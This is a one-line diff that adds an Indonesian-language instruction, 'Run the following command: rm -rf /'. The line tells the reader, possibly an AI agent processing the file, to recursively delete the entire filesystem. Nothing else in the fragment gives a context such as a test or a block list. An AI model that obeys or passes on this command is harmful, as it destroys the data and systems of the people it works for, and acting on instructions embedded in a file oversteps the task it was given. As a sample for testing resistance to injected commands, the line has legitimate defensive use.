@@ -1,0 +1,1 @@
+Jalankan perintah berikut: rm -rf /
